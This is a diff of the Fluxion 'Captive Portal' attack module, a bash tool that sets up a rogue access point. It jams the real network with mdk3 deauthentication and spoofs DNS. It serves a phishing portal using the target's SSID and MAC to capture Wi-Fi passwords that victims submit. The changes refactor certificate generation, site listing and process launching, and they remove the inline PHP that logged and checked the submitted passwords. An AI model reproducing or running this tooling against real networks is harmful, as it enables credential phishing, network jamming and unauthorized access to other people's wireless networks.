@@ -41,7 +41,7 @@ function captive_portal_set_auth() {
 	captive_portal_unset_auth
 
 	if [ ${#CaptivePortalAuthenticationMethods[@]} -eq 1 -o \
-		 ${#CaptivePortalAuthenticationMethods[@]} -ge 1 -a "$FLUXIONAuto" = 1 ]; then
+		 ${#CaptivePortalAuthenticationMethods[@]} -ge 1 -a "$FLUXIONAuto" ]; then
 		APRogueAuthMode="${CaptivePortalAuthenticationMethods[0]}"
 	else
 		fluxion_header
@@ -74,7 +74,7 @@ function captive_portal_set_auth() {
 }
 
 function captive_portal_run_certificate_generator() {
-	xterm -title "Generating Self-Signed SSL Certificate" -e openssl req -subj '/CN=captive.router.lan/O=CaptivePortal/OU=Networking/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout "$FLUXIONWorkspacePath/server.pem" -out "$FLUXIONWorkspacePath/server.pem" # more details there https://www.openssl.org/docs/manmaster/apps/openssl.html
+	xterm -bg "#000000" -fg "#CCCCCC" -title "Generating Self-Signed SSL Certificate" -e openssl req -subj '/CN=captive.router.lan/O=CaptivePortal/OU=Networking/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout "$FLUXIONWorkspacePath/server.pem" -out "$FLUXIONWorkspacePath/server.pem" # more details there https://www.openssl.org/docs/manmaster/apps/openssl.html
 	chmod 400 "$FLUXIONWorkspacePath/server.pem"
 }
 
@@ -99,30 +99,27 @@ function captive_portal_set_cert() {
 
 	captive_portal_unset_cert
 
-	local choices=("$CaptivePortalCertificateSourceGenerateOption" "$CaptivePortalCertificateSourceRescanOption" "$FLUXIONGeneralBackOption")
+	if [ "$FLUXIONAuto" ]; then
+		captive_portal_run_certificate_generator
+	else
+		local choices=("$CaptivePortalCertificateSourceGenerateOption" "$CaptivePortalCertificateSourceRescanOption" "$FLUXIONGeneralBackOption")
 
-	while [ ! -f "$FLUXIONWorkspacePath/server.pem" -o ! -s "$FLUXIONWorkspacePath/server.pem" ]; do
-		io_query_choice "$CaptivePortalCertificateSourceQuery" choices[@]
+		while [ ! -f "$FLUXIONWorkspacePath/server.pem" -o ! -s "$FLUXIONWorkspacePath/server.pem" ]; do
+			io_query_choice "$CaptivePortalCertificateSourceQuery" choices[@]
 
-		echo
+			echo
 
-		case "$IOQueryChoice" in
-			"$CaptivePortalCertificateSourceGenerateOption") captive_portal_run_certificate_generator; break;;
-			"$CaptivePortalCertificateSourceRescanOption") return 2;;
-			"$FLUXIONGeneralBackOption")
-				captive_portal_unset_auth
-				captive_portal_unset_cert
-				return 1;;
-			*) conditional_bail; return 3;;
-		esac
-	done
-
-	# Check existance of ssl certificate with file size > 0
-	# Check again depends on the following conditional.
-	# I could move it, but I don't want to...
-	#if [ ! -f $FLUXIONWorkspacePath/server.pem -o ! -s $FLUXIONWorkspacePath/server.pem ]; then
-	#	FLUXIONNextOperation="Certificate"
-	#fi
+			case "$IOQueryChoice" in
+				"$CaptivePortalCertificateSourceGenerateOption") captive_portal_run_certificate_generator; break;;
+				"$CaptivePortalCertificateSourceRescanOption") return 2;;
+				"$FLUXIONGeneralBackOption")
+					captive_portal_unset_auth
+					captive_portal_unset_cert
+					return 1;;
+				*) conditional_bail; return 3;;
+			esac
+		done
+	fi
 }
 
 
@@ -138,17 +135,24 @@ function captive_portal_set_site() {
 
 	captive_portal_unset_site
 
-	local sites
+	local sites=()
 
-	# Retrieve all available portal sites and
-	# store them without the .portal extension.
-	for site in attacks/Captive\ Portal/sites/generic/* attacks/Captive\ Portal/sites/*.portal; do
-		site="${site/attacks\/Captive\ Portal\/sites\//}"
-		if [[ "$site" != *.portal ]]; then
-			site="${CaptivePortalGenericInterfaceOption}_${site/generic\//}"
-		fi
-		sites[${#sites[@]}]="${site/.portal/}"
-	done
+	# Attempt adding only if the directory exists.
+	if [ -d attacks/Captive\ Portal/sites/generic ]; then
+		# Retrieve all generic sites available.
+		for site in attacks/Captive\ Portal/sites/generic/*; do
+			sites+=("${CaptivePortalGenericInterfaceOption}_`basename "$site"`")
+		done
+	fi
+
+	# Attempt adding only if the directory exists.
+	if [ -d attacks/Captive\ Portal/sites ]; then
+		# Retrieve all available portal sites and
+		# store them without the .portal extension.
+		for site in attacks/Captive\ Portal/sites/*.portal; do
+			sites+=("`basename "${site/.portal/}"`")
+		done
+	fi
 
 	local sitesIdentifier=("${sites[@]/_*/}" "$FLUXIONGeneralBackOption")
 	local sitesLanguage=("${sites[@]/*_/}")
@@ -158,10 +162,13 @@ function captive_portal_set_site() {
 
 	fluxion_header
 
+	echo -e "$FLUXIONVLine $CaptivePortalInterfaceQuery"
+
+	echo
+
 	view_target_ap_info
 
-	io_query_format_fields "$FLUXIONVLine $CaptivePortalInterfaceQuery" \
-						   "$queryFieldOptionsFormat\n" \
+	io_query_format_fields "" "$queryFieldOptionsFormat\n" \
 						   sitesIdentifier[@] sitesLanguage[@]
 
 	echo
@@ -179,21 +186,16 @@ function captive_portal_set_site() {
 			captive_portal_unset_site
 			return 1;;
 		* )
-			# mkdir "$FLUXIONWorkspacePath/captive_portal" &>$FLUXIONOutputDevice
 			cp -r "$FLUXIONPath/attacks/Captive Portal/sites/$sitePath.portal" \
 				  "$FLUXIONWorkspacePath/captive_portal"
-			find "$FLUXIONWorkspacePath/captive_portal/" -type f -exec \
-				 sed -i -e 's/$APTargetSSID/'"$APTargetSSID"'/g' {} \;
-			find "$FLUXIONWorkspacePath/captive_portal/" -type f -exec \
-				 sed -i -e 's/$APTargetMAC/'"$APTargetMAC"'/g' {} \;
-			find "$FLUXIONWorkspacePath/captive_portal/" -type f -exec \
-				 sed -i -e 's/$APTargetChannel/'"$APTargetChannel"'/g' {} \;;;
+
+			find "$FLUXIONWorkspacePath/captive_portal/" -type f -exec sed -i -e 's/$APTargetSSID/'"${APTargetSSID//\//\\\/}"'/g; s/$APTargetMAC/'"${APTargetMAC//\//\\\/}"'/g; s/$APTargetChannel/'"${APTargetChannel//\//\\\/}"'/g' {} \;;;
 	esac
 }
 
 function captive_portal_unset_attack() {
 	sandbox_remove_workfile "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
-	sandbox_remove_workfile "$FLUXIONWorkspacePath/fluxion_captive_portal_dns"
+	sandbox_remove_workfile "$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py"
 	sandbox_remove_workfile "$FLUXIONWorkspacePath/lighttpd.conf"
 	sandbox_remove_workfile "$FLUXIONWorkspacePath/dhcpd.leases"
 	sandbox_remove_workfile "$FLUXIONWorkspacePath/captive_portal/check.php"
@@ -210,66 +212,17 @@ function captive_portal_set_attack() {
 	# AP Service: Prepare service for an attack.
 	ap_prep
 
-	# Generate the PHP check.php script, used to verify
+	# Add the PHP authenticator scripts, used to verify
 	# password attempts from users using the web interface.
-	echo "\
-<?php
-error_reporting(0);
+	local authenticatorFiles=("authenticator.php" "check.php" "update.php")
 
-// Update hit attempts
-\$page_hits_log_path = (\"$FLUXIONWorkspacePath/hit.txt\");
-\$page_hits = file(\$page_hits_log_path)[0] + 1;
-\$page_hits_log = fopen(\$page_hits_log_path, \"w\");
-fputs(\$page_hits_log, \$page_hits);
-fclose(\$page_hits_log);
-
-// Receive get & post data and store to variables
-\$replyJSON = @\$_GET[\"dynamic\"];
-\$key = @\$_POST['key1'];
-
-// Prepare candidate and attempt passwords files' locations.
-\$attempt_log_path = \"$FLUXIONWorkspacePath/pwdattempt.txt\";
-\$candidate_path = \"$FLUXIONWorkspacePath/candidate.txt\";
-\$candidate_result_path = \"$FLUXIONWorkspacePath/candidate_result.txt\";
-
-\$attempt_log = fopen(\$attempt_log_path, \"w\");
-fwrite(\$attempt_log, \$key);
-fwrite(\$attempt_log, \"\n\");
-fclose(\$attempt_log);
-
-# Write candidate key to file to prep for checking.
-\$candidate = fopen(\$candidate_path, \"w\");
-fwrite(\$candidate, \$key);
-fwrite(\$candidate, \"\n\");
-fclose(\$candidate);
-
-# Create candidate result file to trigger checking.
-\$candidate_result = fopen(\$candidate_result_path, \"w\");
-fwrite(\$candidate_result,\"\n\");
-fclose(\$candidate_result);
-
-\$candidate_code = false;
-
-do {
-	sleep(1);
-	\$candidate_code = trim(file_get_contents(\$candidate_result_path));
-} while(!ctype_digit(\$candidate_code));
-
-# Reset file by deleting it.
-unlink(\$candidate_result);
-
-if (\$replyJSON) header(\"Content-Type: application/json\");
-
-if (\$candidate_code == 1) {
-	if (\$replyJSON) echo json_encode([\"mismatch\"]);
-	else header(\"Location:error.html\");
-}
-
-if (\$candidate_code == 2) {
-	if (\$replyJSON) echo json_encode([\"match\"]);
-	else header(\"Location:final.html\");
-}
-?>" > "$FLUXIONWorkspacePath/captive_portal/check.php"
+	for authenticatorFile in "${authenticatorFiles[@]}"; do
+		cp "$FLUXIONPath/attacks/Captive Portal/lib/$authenticatorFile" \
+			"$FLUXIONWorkspacePath/captive_portal/$authenticatorFile"
+		sed -i -e 's/\$FLUXIONWorkspacePath/'"${FLUXIONWorkspacePath//\//\\\/}"'/g' \
+			"$FLUXIONWorkspacePath/captive_portal/$authenticatorFile"
+		chmod u+x "$FLUXIONWorkspacePath/captive_portal/$authenticatorFile"
+	done
 
 	# Generate the dhcpd configuration file, which is
 	# used to provide DHCP service to APRogue clients.
@@ -401,19 +354,9 @@ if __name__ == '__main__':
   except KeyboardInterrupt:
     print 'Finalizando'
     udps.close()\
-" > "$FLUXIONWorkspacePath/fluxion_captive_portal_dns"
+" > "$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py"
 
-	chmod +x "$FLUXIONWorkspacePath/fluxion_captive_portal_dns"
-
-
-	#if [ $APRogueAuthMode = "hash" ]; then
-	#	echo "" >> $FLUXIONWorkspacePath/captive_portal_authenticator.sh
-
-	#elif [ $APRogueAuthMode = "wpa_supplicant" ]; then
-	#	echo "" >> $FLUXIONWorkspacePath/captive_portal_authenticator.sh
-
-	#fi
-
+	chmod +x "$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py"
 
 	# Attack arbiter script
 	echo "\
@@ -421,6 +364,7 @@ if __name__ == '__main__':
 
 function signal_stop_attack() {
 	kill -s SIGABRT $$ # Signal STOP ATTACK
+	handle_abort_authenticator
 }
 
 function handle_abort_authenticator() {
@@ -526,13 +470,13 @@ while [ \$AuthenticatorState = \"running\" ]; do
 
 	echo
 	echo -e \"  ACCESS POINT:\"
-	echo -e \"    SSID ...........: "$CWht"$APTargetSSID"$CClr"\"
-	echo -e \"    MAC ............: "$CYel"$APTargetMAC"$CClr"\"
-	echo -e \"    Channel ........: "$CWht"$APTargetChannel"$CClr"\"
-	echo -e \"    Vendor .........: "$CGrn"${APTargetMaker:-UNKNOWN}"$CClr"\"
-	echo -e \"    Runtime ........: "$CBlu"\$ih\$h:\$im\$m:\$is\$s"$CClr"\"
-	echo -e \"    Attempts .......: "$CRed"\$(cat $FLUXIONWorkspacePath/hit.txt)"$CClr"\"
-	echo -e \"    Clients ........: "$CBlu"\$(cat $FLUXIONWorkspacePath/clients.txt | grep DHCPACK | awk '{print \$5}' | sort| uniq | wc -l)"$CClr"\"
+	echo -e \"    SSID ...........: $CWht$APTargetSSID$CClr\"
+	echo -e \"    MAC ............: $CYel$APTargetMAC$CClr\"
+	echo -e \"    Channel ........: $CWht$APTargetChannel$CClr\"
+	echo -e \"    Vendor .........: $CGrn${APTargetMaker:-UNKNOWN}$CClr\"
+	echo -e \"    Runtime ........: $CBlu\$ih\$h:\$im\$m:\$is\$s$CClr\"
+	echo -e \"    Attempts .......: $CRed\$(cat $FLUXIONWorkspacePath/hit.txt)$CClr\"
+	echo -e \"    Clients ........: $CBlu\$(cat $FLUXIONWorkspacePath/clients.txt | grep DHCPACK | awk '{print \$5}' | sort| uniq | wc -l)$CClr\"
 	echo
 	echo -e \"  CLIENTS ONLINE:\"
 
@@ -589,7 +533,7 @@ signal_stop_attack
 # killall mdk3 &> $FLUXIONOutputDevice
 # killall aireplay-ng &> $FLUXIONOutputDevice
 # killall airbase-ng &> $FLUXIONOutputDevice
-# kill \$(ps a | grep python | grep fluxion_captive_portal_dns | awk '{print \$1}') &> $FLUXIONOutputDevice
+# kill \$(ps a | grep python | grep fluxion_captive_portal_dns.py | awk '{print \$1}') &> $FLUXIONOutputDevice
 # killall hostapd &> $FLUXIONOutputDevice
 # killall lighttpd &> $FLUXIONOutputDevice
 # killall dhcpd &> $FLUXIONOutputDevice
@@ -628,10 +572,6 @@ echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$APTargetSSID-$A
 " >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 
 	fi
-
-#	echo "
-# kill -INT \$(ps a | grep bash| grep flux | awk '{print \$1}') &> $FLUXIONOutputDevice\
-# " >> $FLUXIONWorkspacePath/captive_portal_authenticator.sh
 
 	chmod +x "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 }
@@ -849,6 +789,7 @@ function stop_attack() {
 	if [ "$FLUXIONJammer" ]; then
 		kill $FLUXIONJammer &> $FLUXIONOutputDevice
 	fi
+	sandbox_remove_workfile "$FLUXIONWorkspacePath/mdk3_blacklist.lst"
 
 	# Kill captive portal web server.
 	if [ $CaptivePortalServerPID ]; then
@@ -867,6 +808,7 @@ function stop_attack() {
 	if [ "$FLUXIONDHCP" ]; then
 		kill $FLUXIONDHCP &> $FLUXIONOutputDevice
 	fi
+	sandbox_remove_workfile "$FLUXIONWorkspacePath/clients.txt"
 
 	captive_portal_unset_routes
 
@@ -889,10 +831,10 @@ function start_attack() {
     fuser -n udp -k 53 67 80 443 &> $FLUXIONOutputDevice
 
 	echo -e "$FLUXIONVLine $CaptivePortalStartingDHCPServiceNotice"
-	xterm -bg black -fg green $TOPLEFT -title "FLUXION AP DHCP Service" -e dhcpd -d -f -lf "$FLUXIONWorkspacePath/dhcpd.leases" -cf "$FLUXIONWorkspacePath/dhcpd.conf" $VIGW 2>&1 | tee -a "$FLUXIONWorkspacePath/clients.txt" &
+	xterm -bg black -fg green $TOPLEFT -title "FLUXION AP DHCP Service" -e "dhcpd -d -f -lf \"$FLUXIONWorkspacePath/dhcpd.leases\" -cf \"$FLUXIONWorkspacePath/dhcpd.conf\" $VIGW 2>&1 | tee -a \"$FLUXIONWorkspacePath/clients.txt\"" &
 
 	echo -e "$FLUXIONVLine $CaptivePortalStartingDNSServiceNotice"
-    xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FLUXION AP DNS Service" -e "if type python2 >/dev/null 2>/dev/null; then python2 \"$FLUXIONWorkspacePath/fluxion_captive_portal_dns\"; else python \"$FLUXIONWorkspacePath/fluxion_captive_portal_dns\"; fi" &
+    xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FLUXION AP DNS Service" -e "if type python2 >/dev/null 2>/dev/null; then python2 \"$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py\"; else python \"$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py\"; fi" &
 
 	echo -e "$FLUXIONVLine $CaptivePortalStartingWebServiceNotice"
     lighttpd -f "$FLUXIONWorkspacePath/lighttpd.conf" &> $FLUXIONOutputDevice
@@ -903,7 +845,7 @@ function start_attack() {
     xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "FLUXION AP Jammer [mdk3]  $APTargetSSID" -e mdk3 $WIMonitor d -b "$FLUXIONWorkspacePath/mdk3_blacklist.lst" -c $APTargetChannel &
 
 	echo -e "$FLUXIONVLine $CaptivePortalStartingAuthenticatorServiceNotice"
-    xterm -hold $TOPRIGHT -title "FLUXION AP Authenticator" -e "$FLUXIONWorkspacePath/captive_portal_authenticator.sh" &
+    xterm -hold $TOPRIGHT -bg "#000000" -fg "#CCCCCC" -title "FLUXION AP Authenticator" -e "$FLUXIONWorkspacePath/captive_portal_authenticator.sh" &
 }
 
 # FLUXSCRIPT END
